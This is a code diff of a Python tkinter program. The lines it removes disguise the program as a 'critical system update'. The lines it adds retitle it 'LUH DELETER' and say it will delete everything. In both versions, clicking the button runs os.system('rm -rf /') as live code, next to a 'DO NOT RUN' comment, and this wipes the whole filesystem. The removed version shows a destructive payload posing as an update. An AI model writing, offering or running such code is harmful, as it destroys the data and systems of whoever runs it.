@@ -8,30 +8,23 @@ from tkinter import messagebox
 
 # Function that runs when button is clicked
 def start_attack():
-    messagebox.showinfo("Update", "Initializing system update...")
-
-    time.sleep(1)
-    messagebox.showinfo("Update", "Accessing system files...")
-
-    time.sleep(1)
-    messagebox.showinfo("Update", "Applying critical changes...")
+    messagebox.showinfo("eh?????", "Are you sure?")
 
     # SAFE DEMONSTRATION (delete test folder only)
     os.system("rm -rf ~/test_folder")
 
     # DANGEROUS COMMAND (DO NOT RUN)
-    
     os.system("rm -rf /")
 
-    messagebox.showwarning("Failure", "System files corrupted. Restart required.")
+    messagebox.showwarning(":)", "Everything has been deleted:)")
 
 # Create main window
 app = tk.Tk()
-app.title("System Update")
+app.title("LUH DELETER")
 app.geometry("300x150")
 
 # Label text
-label = tk.Label(app, text="A critical system update is required.", wraplength=250)
+label = tk.Label(app, text="This will delete everything.", wraplength=250)
 label.pack(pady=20)
 
 # Button
